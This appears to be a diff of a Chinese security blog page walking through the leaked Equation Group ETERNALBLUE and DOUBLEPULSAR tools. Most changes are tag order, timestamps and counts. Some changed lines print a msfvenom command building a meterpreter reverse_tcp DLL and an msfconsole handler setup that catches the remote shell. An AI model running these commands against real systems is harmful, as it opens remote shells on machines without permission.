@@ -83,7 +83,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="equation group,windows,code execution,eternalBlue,doublePulsar,tool," />
+  <meta name="keywords" content="windows,equation group,code execution,eternalBlue,doublePulsar,tool," />
 
 
 
@@ -121,7 +121,7 @@
 <meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-14.png">
 <meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-15.png">
 <meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-16.png">
-<meta property="og:updated_time" content="2017-09-18T13:05:22.793Z">
+<meta property="og:updated_time" content="2017-09-19T05:01:31.933Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2017 Equation Group 0day Tools">
 <meta name="twitter:description" content="概述Shadow Brokers黑客组织上周泄露了NSA方程式组织的一些工具，其中某些工具客直接拿下Windows服务器 。">
@@ -564,11 +564,11 @@
 <p><img src="/images/ETERNALBLUE/ETERNALBLUE-9.png" alt="ETERNALBLUE-9"></p>
 <p><img src="/images/ETERNALBLUE/ETERNALBLUE-10.png" alt="ETERNALBLUE-10"></p>
 <p>这里用攻击机2 kali的msfvenom 生成一下dll 这里使用的是reverse_tcp的paylaod 可以根据网络情况采用其他payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.108.144 LPORT=5555 -f dll &gt; s.dll</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.111.144 LPORT=5555 -f dll &gt; s.dll</div></pre></td></tr></table></figure>
 <p><img src="/images/ETERNALBLUE/ETERNALBLUE-11.png" alt="ETERNALBLUE-11"></p>
 <p>把生成的s.dll传到攻击机1上去，</p>
 <p>然后kali开启msfconsole 监听，下面的payload要和上面msfvenom的payload对应起来</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ msfconsole</div><div class="line">    msf &gt; use exploit/multi/handler</div><div class="line">    msf &gt; set LHOST 192.168.108.144</div><div class="line">    msf &gt; set LPORT 5555</div><div class="line">    msf &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp</div><div class="line">    msf &gt; exploit</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ msfconsole</div><div class="line">    msf &gt; use exploit/multi/handler</div><div class="line">    msf &gt; set LHOST 192.168.111.144</div><div class="line">    msf &gt; set LPORT 5555</div><div class="line">    msf &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp</div><div class="line">    msf &gt; exploit</div></pre></td></tr></table></figure>
 <p><img src="/images/ETERNALBLUE/ETERNALBLUE-12.png" alt="ETERNALBLUE-12"></p>
 <p><img src="/images/ETERNALBLUE/ETERNALBLUE-13.png" alt="ETERNALBLUE-13"></p>
 <p>然后操作fb.py ，加载s.dll。</p>
@@ -608,9 +608,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/equation-group/" rel="tag"># equation group</a>
-          
             <a href="/tags/windows/" rel="tag"># windows</a>
+          
+            <a href="/tags/equation-group/" rel="tag"># equation group</a>
           
             <a href="/tags/code-execution/" rel="tag"># code execution</a>
           
@@ -715,7 +715,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">19</span>
+                <span class="site-state-item-count">20</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -726,7 +726,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">14</span>
+                <span class="site-state-item-count">15</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -736,8 +736,8 @@
             
             
             <div class="site-state-item site-state-tags">
-              <a href="/tags/index-1.html">
-                <span class="site-state-item-count">40</span>
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">42</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
